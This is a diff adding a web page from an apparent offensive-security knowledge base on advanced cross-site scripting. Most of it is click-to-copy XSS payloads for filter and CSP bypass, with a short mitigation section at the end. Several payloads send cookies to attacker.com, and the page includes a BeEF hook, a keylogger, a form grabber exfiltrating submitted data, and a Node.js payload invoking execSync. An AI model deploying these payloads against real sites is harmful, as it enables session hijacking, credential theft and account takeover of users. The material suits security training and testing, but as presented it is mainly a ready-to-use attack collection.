@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Deep Dive | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.8rem; font-family: 'Courier New', monospace; font-size: 0.72rem; word-break: break-all; overflow-x: auto; transition: var(--transition); cursor: pointer; }
+    .payload-item:hover { border-color: var(--primary); background: var(--bg-card); }
+    .payload-category { margin: 2rem 0 1rem; padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid var(--primary); border-radius: 0 0.5rem 0.5rem 0; font-weight: 600; color: var(--primary); font-size: 0.9rem; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    th, td { padding: 0.75rem 1rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg-elevated); font-weight: 600; color: var(--primary); }
+    td { color: var(--text-secondary); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    @media (max-width: 768px) { .payload-grid { grid-template-columns: 1fr; } .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../web/index.html">Web Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Web Security</a> / Advanced XSS
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | CWE-79</span>
+      <h1>🎭 Advanced XSS Techniques</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>CWE</strong><span>CWE-79</span></div>
+        <div class="meta-item"><strong>OWASP</strong><span>A03:2021</span></div>
+        <div class="meta-item"><strong>Type</strong><span>Reflected/Stored/DOM</span></div>
+        <div class="meta-item"><strong>Impact</strong><span>Session Hijacking</span></div>
+      </div>
+    </div>
+
+    <!-- 1. OVERVIEW -->
+    <div class="content-section" id="overview">
+      <h2>🧠 XSS Types Deep Dive</h2>
+      
+      <table>
+        <thead>
+          <tr><th>Type</th><th>Description</th><th>Detection</th><th>Impact</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><strong>Reflected</strong></td><td>User input reflected in response</td><td>Easy</td><td>Medium</td></tr>
+          <tr><td><strong>Stored</strong></td><td>Malicious code stored on server</td><td>Medium</td><td>Critical</td></tr>
+          <tr><td><strong>DOM-based</strong></td><td>Client-side manipulation</td><td>Hard</td><td>Medium</td></tr>
+          <tr><td><strong>Mutation</strong></td><td>Context-dependent bypass</td><td>Hard</td><td>High</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- 2. BYPASS TECHNIQUES -->
+    <div class="content-section" id="bypass">
+      <h2>🛡️ Filter Bypass Techniques</h2>
+      
+      <div class="payload-category">🔍 Script Tag Variations</div>
+      <div class="payload-grid">
+        <div class="payload-item" onclick="copyPayload(this)"><script>alert(1)</script></div>
+        <div class="payload-item" onclick="copyPayload(this)"><scr<script>ipt>alert(1)</scr</script>ipt></div>
+        <div class="payload-item" onclick="copyPayload(this)"><sCrIpT>alert(1)</sCrIpT></div>
+        <div class="payload-item" onclick="copyPayload(this)"><img src=x onerror=alert(1)></div>
+        <div class="payload-item" onclick="copyPayload(this)"><svg/onload=alert(1)></div>
+        <div class="payload-item" onclick="copyPayload(this)"><body onload=alert(1)></div>
+        <div class="payload-item" onclick="copyPayload(this)"><iframe src="javascript:alert(1)"></iframe></div>
+        <div class="payload-item" onclick="copyPayload(this)"><object data="javascript:alert(1)"></object></div>
+        <div class="payload-item" onclick="copyPayload(this)"><embed src="javascript:alert(1)"></embed></div>
+        <div class="payload-item" onclick="copyPayload(this)"><math><mi/href="javascript:alert(1)">x</mi></math></div>
+      </div>
+
+      <div class="payload-category">🔄 Event Handler Variants</div>
+      <div class="payload-grid">
+        <div class="payload-item" onclick="copyPayload(this)"><img src=x onerror=alert(1)></div>
+        <div class="payload-item" onclick="copyPayload(this)"><img src=x onerror=alert`1`></div>
+        <div class="payload-item" onclick="copyPayload(this)"><svg/onload=alert(1)></div>
+        <div class="payload-item" onclick="copyPayload(this)"><input onfocus=alert(1) autofocus></div>
+        <div class="payload-item" onclick="copyPayload(this)"><select onfocus=alert(1) autofocus></select></div>
+        <div class="payload-item" onclick="copyPayload(this)"><textarea onfocus=alert(1) autofocus></textarea></div>
+        <div class="payload-item" onclick="copyPayload(this)"><keygen onfocus=alert(1) autofocus></keygen></div>
+        <div class="payload-item" onclick="copyPayload(this)"><video><source onerror=alert(1)></video></div>
+        <div class="payload-item" onclick="copyPayload(this)"><audio src=x onerror=alert(1)></audio></div>
+        <div class="payload-item" onclick="copyPayload(this)"><details open ontoggle=alert(1)></details></div>
+      </div>
+    </div>
+
+    <!-- 3. EVENT HANDLERS -->
+    <div class="content-section" id="events">
+      <h2>🎯 Event Handlers Reference</h2>
+      
+      <table>
+        <thead>
+          <tr><th>Event</th><th>Trigger</th><th>Example</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>onload</td><td>Page/element loads</td><td><code><svg onload=alert(1)></code></td></tr>
+          <tr><td>onerror</td><td>Resource fails</td><td><code><img src=x onerror=alert(1)></code></td></tr>
+          <tr><td>onmouseover</td><td>Mouse hover</td><td><code><img onmouseover=alert(1)></code></td></tr>
+          <tr><td>onfocus</td><td>Element gets focus</td><td><code><input onfocus=alert(1)></code></td></tr>
+          <tr><td>onblur</td><td>Element loses focus</td><td><code><input onblur=alert(1)></code></td></tr>
+          <tr><td>oninput</td><td>User input</td><td><code><input oninput=alert(1)></code></td></tr>
+          <tr><td>onchange</td><td>Value changes</td><td><code><select onchange=alert(1)></code></td></tr>
+          <tr><td>onclick</td><td>Mouse click</td><td><code><div onclick=alert(1)></code></td></tr>
+          <tr><td>ontoggle</td><td>Toggle event</td><td><code><details open ontoggle=alert(1)></code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- 4. DOM XSS -->
+    <div class="content-section" id="dom">
+      <h2>🔍 DOM-Based XSS</h2>
+      
+      <p><strong>Common Sources and Sinks:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Sources (where user input enters DOM)
+document.URL
+document.location
+document.referrer
+window.name
+sessionStorage
+localStorage
+
+# Sinks (where JavaScript executes data)
+innerHTML
+outerHTML
+insertAdjacentHTML
+document.write()
+eval()
+setTimeout()
+setInterval()
+Function()
+new Function()</pre>
+      </div>
+
+      <p><strong>DOM XSS Payloads:</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item" onclick="copyPayload(this)"><img src=x onerror=location='http://attacker.com?c='+document.cookie></div>
+        <div class="payload-item" onclick="copyPayload(this)"><svg/onload=fetch('http://attacker.com/?'+btoa(document.cookie))></div>
+        <div class="payload-item" onclick="copyPayload(this)"><body onload=eval(location.hash.slice(1))>#alert(1)</div>
+        <div class="payload-item" onclick="copyPayload(this)"><script>eval(atob(location.hash.slice(1)))</script></div>
+      </div>
+
+      <p><strong>AngularJS Expression Injection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># AngularJS
+{{constructor.constructor('alert(1)')()}}
+{{a='alert'}onclick=eval(a)}}  # when inside onclick attribute
+{{$on.constructor('alert(1)')()}}</pre>
+      </div>
+    </div>
+
+    <!-- 5. STORED XSS -->
+    <div class="content-section" id="stored">
+      <h2>💾 Stored XSS Exploitation</h2>
+      
+      <p><strong>Real-World Targets:</strong></p>
+      <ul>
+        <li>User profile fields (bio, display name, signature)</li>
+        <li>Comment sections, forums, chat messages</li>
+        <li>File upload metadata (filename, description)</li>
+        <li>Social media posts</li>
+        <li>Email content (subject, body)</li>
+      </ul>
+
+      <p><strong>Stored XSS Payloads:</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item" onclick="copyPayload(this)"><script>fetch('http://attacker.com/c?c='+document.cookie)</script></div>
+        <div class="payload-item" onclick="copyPayload(this)"><img src=x onerror=fetch('http://attacker.com/?'+document.domain)></div>
+        <div class="payload-item" onclick="copyPayload(this)"><svg><animate onbegin=alert(1) attributeName=x></svg></div>
+        <div class="payload-item" onclick="copyPayload(this)"><style>@import'javascript:alert(1)'</style></div>
+      </div>
+    </div>
+
+    <!-- 6. CSP BYPASS -->
+    <div class="content-section" id="csp">
+      <h2>🔐 CSP Bypass Techniques</h2>
+      
+      <div class="vulnerability-box">
+        <strong>CSP Bypass Requires:</strong>
+        <ul>
+          <li>Finding a way to execute JavaScript (inline XSS or whitelist bypass)</li>
+          <li>Using allowed scripts or resources</li>
+          <li>Exploiting whitelist domains for data exfiltration</li>
+        </ul>
+      </div>
+
+      <p><strong>Bypass Techniques:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># JSONP callback abuse
+<script src="https://trusted.com/callback=alert(1)//"></script>
+
+# AngularJS bypassing CSP (no unsafe-eval needed for older)
+<script src="angular.js"></script>
+<div ng-app>
+  {{constructor.constructor('alert(1)')()}}
+</div>
+
+# Using allowed CDN
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js"></script>
+
+# Meta tag refresh CSP bypass
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Mutation XSS (parsing confusion)
+<style></style><img src=x onerror=alert(1)>  # Some parsers execute</pre>
+      </div>
+    </div>
+
+    <!-- 7. XSS TO ACCOUNT TAKEOVER -->
+    <div class="content-section" id="account-takeover">
+      <h2>🎯 Session Hijacking & Account Takeover</h2>
+      
+      <p><strong>Cookie Stealing:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Basic cookie theft
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+
+# Using fetch
+<script>fetch('http://attacker.com/c='+document.cookie)</script>
+
+# Using Image object
+<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
+
+# Using beacon API
+<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script></pre>
+      </div>
+
+      <p><strong>Advanced BeEF Hook:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># BeEF framework hook
+<script src="http://attacker.com/hook.js"></script>
+
+# Custom keylogger
+<script>
+document.onkeypress = function(e) {
+  fetch('http://attacker.com/k?q=' + btoa(e.key));
+}
+</script>
+
+# Form grabber
+<script>
+document.addEventListener('submit', function(e) {
+  var form = e.target;
+  fetch('http://attacker.com/f', {
+    method: 'POST',
+    body: new URLSearchParams(new FormData(form))
+  });
+});
+</script></pre>
+      </div>
+
+      <p><strong>Polyglot XSS (Multiple Contexts):</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item" onclick="copyPayload(this)">javascript:/*--></title></style></textarea></script>x" onmouseover=alert(1)//</div>
+        <div class="payload-item" onclick="copyPayload(this)"><svg id="x" xmlns="http://www.w3.org/2000/svg"><g/onload=alert(1)></g></svg></div>
+        <div class="payload-item" onclick="copyPayload(this)"><!--<svg onload=alert(1)//--></div>
+        <div class="payload-item" onclick="copyPayload(this)"><foreignObject><img src=x onerror=alert(1)></foreignObject></div>
+      </div>
+    </div>
+
+    <!-- 8. XSS TO RCE -->
+    <div class="content-section" id="rce">
+      <h2>💥 XSS to RCE (Node.js/MongoDB)</h2>
+      
+      <p><strong>NoSQL Injection via XSS:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># When user input is evaluated in MongoDB
+# Payload to execute JavaScript
+"; return 1; var x='"; console.log(1); var y='"
+# Or
+{{.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()}}</pre>
+      </div>
+
+      <p><strong>Prototype Pollution via XSS:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Pollute Object prototype
+<script>
+Object.defineProperty(Object.prototype, 'constructor', { 
+  get: function() { 
+    return function() { 
+      eval(atob('some_payload')); 
+    }
+  }
+});
+</script>
+
+# Another prototype pollution chain
+{"__proto__":{"constructor":"function(){}"}}</pre>
+      </div>
+    </div>
+
+    <!-- 9. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ XSS Mitigation</h2>
+      
+      <div class="mitigation-box">
+        <strong>✅ Content Security Policy:</strong>
+        <pre style="color: var(--text-secondary); margin-top: 0.5rem; font-size: 0.85rem;">Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
+
+# Strict CSP with nonce
+Content-Security-Policy: script-src 'nonce-random123' 'strict-dynamic';</pre>
+      </div>
+
+      <p><strong>Input Validation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># HTML encoding (output encoding)
+function escapeHtml(text) {
+  const map = {
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#39;'
+  };
+  return text.replace(/[&<>"']/g, c => map[c]);
+}
+
+# DOMPurify for HTML sanitization
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(userInput);</pre>
+      </div>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank">PayloadsAllTheThings XSS</a></li>
+        <li><a href="https://xss.pwnfunction.com/" target="_blank">PwnFunction XSS Labs</a></li>
+      </ul>
+    </div>
+
+    <a href="xss.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to XSS</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+});
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => btn.textContent = 'Copy', 2000);
+}
+function copyPayload(el) {
+  navigator.clipboard.writeText(el.textContent);
+  el.style.borderColor = 'var(--primary)';
+}
+</script>
+
+</body>
+</html>
